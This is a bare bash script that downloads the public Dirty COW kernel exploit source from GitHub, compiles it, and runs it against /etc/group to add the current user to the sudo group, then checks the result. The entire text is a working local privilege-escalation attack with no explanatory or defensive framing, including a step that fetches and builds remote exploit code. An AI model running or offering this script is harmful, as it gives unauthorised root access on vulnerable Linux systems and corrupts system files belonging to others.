#!/bin/bash
wget "https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c"
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w /etc/group "$(sed "/\(sudo*\)/ s/$/,$(whoami)/" /etc/group)"
cat /etc/group | grep sudo